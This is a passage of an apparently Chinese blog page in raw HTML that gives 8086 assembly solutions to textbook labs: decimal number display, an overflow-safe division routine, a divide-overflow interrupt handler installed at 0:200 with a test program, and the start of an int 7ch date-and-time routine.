class="hljs-keyword">pop</span> <span class="hljs-built_in">dx</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ax</span><br><span class="hljs-keyword">ret</span><br><br><br>code ends<br>end start<br><br><br></code></pre></td></tr></table></figure><p>2.数值显示（加上判断溢出后的代码没看懂）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code,<span class="hljs-built_in">ds</span>:data,<span class="hljs-built_in">ss</span>:stack<br>data <span class="hljs-meta">segment</span><br>    <span class="hljs-built_in">db</span> <span class="hljs-number">10</span> dup(<span class="hljs-number">0</span>)<br>data ends<br> <br>stack <span class="hljs-meta">segment</span><br>    <span class="hljs-built_in">dw</span> <span class="hljs-number">16</span> dup(<span class="hljs-number">0</span>)    <span class="hljs-comment">;32字节</span><br>stack ends<br> <br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,data    <span class="hljs-comment">;设置ds段地址</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">bx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,stack    <span class="hljs-comment">;设置栈顶</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ss</span>,<span class="hljs-built_in">bx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">20H</span><br> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">12666</span>     <span class="hljs-comment">;要显示的数据</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span>         <span class="hljs-comment">;ds:si指向字符串首地址</span><br>    <span class="hljs-keyword">call</span> dtoc        <span class="hljs-comment">;将数据转为十进制字符</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-number">dh</span>,<span class="hljs-number">8</span>    <span class="hljs-comment">;在屏幕第几行开始显示</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>,<span class="hljs-number">3</span>    <span class="hljs-comment">;在屏幕第几列开始显示</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">2</span>    <span class="hljs-comment">;显示的字符的颜色</span><br>    <span class="hljs-keyword">call</span> show_str<br> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00H</span>    <span class="hljs-comment">;程序返回</span><br>    <span class="hljs-keyword">int</span> <span class="hljs-number">21H</span><br><span class="hljs-symbol"> </span><br><span class="hljs-symbol"> </span><br><span class="hljs-symbol">dtoc:</span>    <span class="hljs-comment">;功能：将给定的word型数据转为十进制字符形式，存入data段，首地址ds:si</span><br>            <span class="hljs-comment">;参数：ax 指定的word数据 </span><br>            <span class="hljs-comment">;返回：ds:si指向data段字符串首地址</span><br>    <br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span><span class="hljs-comment">;    ;将子程序用到的寄存器压入栈</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><span class="hljs-comment">;    </span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">dx</span><span class="hljs-comment">;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">si</span><span class="hljs-comment">;</span><br> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">000aH</span>    <span class="hljs-comment">;bl = 除数，bh = 一共除了几次</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,<span class="hljs-number">0</span>    <span class="hljs-comment">;即将进行除法，dx是高16位，低16位在ax中</span><br><span class="hljs-symbol">pushyushu:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-built_in">bl</span>    <span class="hljs-comment">;cx = 除数</span><br>    <span class="hljs-keyword">call</span> divdw    <span class="hljs-comment">;调用不会溢出的除法函数，结果的商的高16位，在dx中，</span><br>                    <span class="hljs-comment">;低16位在ax中，余数在cx中，余数一定&lt;10</span><br> <br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span>        <span class="hljs-comment">;cx=余数，这个余数在显示的时候要倒序显示，因此先压入栈</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-number">bh</span>         <span class="hljs-comment">;记录将余数压入栈的次数</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-built_in">ax</span>      <span class="hljs-comment">;cx = ax = 结果的商的低16位</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">cx</span>,<span class="hljs-built_in">dx</span>      <span class="hljs-comment">;dx是结果的商的高16位，ax和dx一定都是非负数</span><br>    <span class="hljs-keyword">jcxz</span> popyushu        <span class="hljs-comment">;若cx=0，则说明除法计算已经完毕，跳转下一步执行</span><br>    <span class="hljs-keyword">jmp</span> short pushyushu<br><span class="hljs-symbol"> </span><br><span class="hljs-symbol">popyushu:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-number">ch</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">bh</span>    <span class="hljs-comment">;ch=0，所以cx = 将余数压入栈的次数，也就是接下来的循环次数</span><br><span class="hljs-symbol">s1:</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ax</span><span class="hljs-comment">;            ;从栈中pop出一个余数</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">30H</span>         <span class="hljs-comment">;从数字转为对应的数字字符</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">si</span>],<span class="hljs-built_in">al</span>     <span class="hljs-comment">;用al就够了</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br>    <span class="hljs-keyword">loop</span> s1<br>    <br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">si</span>    <span class="hljs-comment">;子程序结束，将寄存器的值pop出来</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">dx</span><span class="hljs-comment">;    </span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><span class="hljs-comment">;</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><span class="hljs-comment">;</span><br>    <br>    <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"> </span><br><span class="hljs-symbol">divdw:</span>      <span class="hljs-comment">;功能：计算word型被除数与byte型除数的除法</span><br>            <span class="hljs-comment">;参数：  ax=被除数低16位，dx=被除数高16位，cx = 除数</span><br>            <span class="hljs-comment">;返回：  ax=商的低16位，dx=商的高16位，cx = 余数</span><br> <br>    <span class="hljs-comment">;计算公式： X/N = int( H/N ) * 65536 + [rem( H/N) * 65536 + L]/N  </span><br>    <span class="hljs-comment">;其中X为被除数，N为除数，H为被除数的高16位，L为被除数的低16位，</span><br>    <span class="hljs-comment">;int()表示结果的商，rem()表示结果的余数。</span><br> <br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span>      <span class="hljs-comment">;bx是额外用到的寄存器，要压入栈</span><br> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-built_in">ax</span>    <span class="hljs-comment">;bx=L</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">dx</span>    <span class="hljs-comment">;ax=H</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,<span class="hljs-number">0</span>     <span class="hljs-comment">;dx=0</span><br>    <span class="hljs-keyword">div</span> <span class="hljs-built_in">cx</span>        <span class="hljs-comment">;计算H/N，结果的商即int(H/N)保存在ax，余数即rem(H/N)保存在dx</span><br> <br>                    <span class="hljs-comment">;接下来要计算int(H/N)*65536，思考一下，65536就是0001 0000 H，</span><br>                    <span class="hljs-comment">;因此计算结果就是，高16位=int(H/N)，低16位为0000H。</span><br> <br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">ax</span>         <span class="hljs-comment">;将int(H/N)*65536结果的高16位，即int(H/N)，压入栈</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">ax</span>         <span class="hljs-comment">;将int(H/N)*65536结果的低16位，即0000H，压入栈</span><br> <br>                    <span class="hljs-comment">;接下来要计算 rem(H/N)*65536 ，同理可得，</span><br>                    <span class="hljs-comment">;计算结果为 高16位=  rem(H/N)*65536 ，即此时dx的值，</span><br>                    <span class="hljs-comment">;低16位为 0000H。</span><br> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">bx</span>     <span class="hljs-comment">;ax = bx = L ，即 [rem(H/N)*65536 + L]的低16位</span><br>    <span class="hljs-keyword">div</span> <span class="hljs-built_in">cx</span>        <span class="hljs-comment">;计算 [rem( H/N) * 65536 + L]/N ，结果的商保存在ax，余数保存在dx</span><br> <br>                    <span class="hljs-comment">;接下来要将两项求和。  左边项的高、低16位都在栈中，</span><br>                    <span class="hljs-comment">;其中高16位就是最终结果的高16位，低16位是0000H。</span><br>                    <span class="hljs-comment">;右边项的商为16位，在ax中，也就是最终结果的低16位，</span><br>                    <span class="hljs-comment">;余数在dx中，也就是最终结果的余数。</span><br> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-built_in">dx</span>     <span class="hljs-comment">;cx = 最终结果的余数</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span>        <span class="hljs-comment">;cx = int(H/N)*65536结果的低16位，即0000H。</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">dx</span>        <span class="hljs-comment">;bx = int(H/N)*65536结果的高16位，即最终结果的高16位</span><br> <br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span>    <span class="hljs-comment">;还原bx的值</span><br> <br>    <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"> </span><br><span class="hljs-symbol">    </span><br><span class="hljs-symbol">show_str:</span><br>                <span class="hljs-comment">;功能：将data段中首地址为ds:si的字符，以指定颜色显示在屏幕指定位置</span><br>                <span class="hljs-comment">;参数：dh 行号， dl 列号 ，cl 颜色</span><br>                <span class="hljs-comment">;返回：无</span><br> <br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">dx</span>        <span class="hljs-comment">;将子程序用到的寄存器压入栈</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">si</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">ax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0B800H</span>    <span class="hljs-comment">;设置es为显示区段地址</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">00A0H</span>    <span class="hljs-comment">;设置首字符显示的地址</span><br>    <span class="hljs-keyword">mul</span> <span class="hljs-number">dh</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-number">dh</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">dx</span> <br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">dx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-built_in">ax</span>    <span class="hljs-comment">;bx是显示区的偏移地址</span><br>        <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">cl</span>    <span class="hljs-comment">;用al存储属性字节</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-number">ch</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span><br><span class="hljs-symbol">    </span><br><span class="hljs-symbol">    s:</span>                <span class="hljs-comment">;循环读取字符并显示</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">si</span>]<br>    <span class="hljs-keyword">jcxz</span> ok            <span class="hljs-comment">;若读到0，就退出循环</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">cl</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">bx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">bx</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br>    <span class="hljs-keyword">jmp</span> short s<br><span class="hljs-symbol"> </span><br><span class="hljs-symbol">    ok:</span>        <span class="hljs-comment">;将寄存器的值pop出来</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ax</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">si</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">dx</span><br>    <br>    <span class="hljs-keyword">ret</span>    <span class="hljs-comment">;返回</span><br> <br> <br>code ends<br>end start<br> <br><br><br></code></pre></td></tr></table></figure><hr /><h2 id="实验12-编写0号中断的处理程序">实验12 编写0号中断的处理程序</h2><hr /><p>1.编写 0 号中断的处理程序并将其安装在 0:200处，使得在除法溢出发生时，屏幕中间自动显示字符串“divideoverflow!”,然后返回到DOS。安装完中断处理程序后，编写针对该中断处理程序的测试程序，并运行测试程序，检查是否正确触发中断处理程序。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,offset do0                <span class="hljs-comment">;设置ds:si指向源地址</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">200h</span>                      <span class="hljs-comment">;设置es:di指向目的地址</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,offset do0end-offset do0  <span class="hljs-comment">;cx为传输长度</span><br><span class="hljs-keyword">cld</span>                              <span class="hljs-comment">;传输方向为正</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span>                        <span class="hljs-comment">;用movsb指令，将do0的代码送入0:200处</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">0</span>],<span class="hljs-number">200h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">2</span>],<span class="hljs-number">0h</span>     <span class="hljs-comment">;设置中断向量</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">   do0:</span><span class="hljs-keyword">jmp</span> short do0start       <span class="hljs-comment">;EB10 占两个字节，所以下面是202h，不是200h</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&quot;divide overflow!&quot;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"> do0start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">202h</span>      <span class="hljs-comment">;设置ds:si指向字符串</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0b800h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">12</span>*<span class="hljs-number">160</span>+<span class="hljs-number">33</span>*<span class="hljs-number">2</span>    <span class="hljs-comment">;设置es:di指向显存空间的中间位置</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">16</span>             <span class="hljs-comment">;cx为字符串长度</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">si</span>]<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">di</span>],<span class="hljs-built_in">al</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">di</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">di</span>],<span class="hljs-number">2H</span>  <br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">di</span><br><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br><span class="hljs-keyword">loop</span> s<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">do0end:</span><span class="hljs-keyword">nop</span><br><br>   <br>code ends<br>end start<br><br><br>测试程序：<br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">1000h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">bh</span>,<span class="hljs-number">1h</span><br><span class="hljs-keyword">div</span> <span class="hljs-number">bh</span><br><br><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><br><br>code ends<br>end start<br><br><br></code></pre></td></tr></table></figure><hr /><h2 id="实验13-编写0号中断的处理程序">实验13 编写0号中断的处理程序</h2><hr /><p>编写并安装 int 7ch 中断例程，功能为以“年/月/日时:分:秒”的格式，在屏幕中间显示当前的日期、时间。中断例程安装在 0:200处。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,offset a           <span class="hljs-comment">;设置ds:si指向源地址</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">200h</span>               <span class="hljs-comment">;设置es:di指向目的地址</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,offset aend-offset a      <span class="hljs-comment">;cx为传输长度</span><br>        <span class="hljs-keyword">cld</span>                               <span class="hljs-comment">;传输方向为正</span><br>        <span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span>                        <span class="hljs-comment">;用movsb指令，将a的代码送入0:200处</span><br>  <br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">7ch</span>*<span class="hljs-number">4</span>],<span class="hljs-number">200h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">7ch</span>*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>],<span class="hljs-number">0</span>    <span class="hljs-comment">;设置中断向量</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol">        </span><br><span 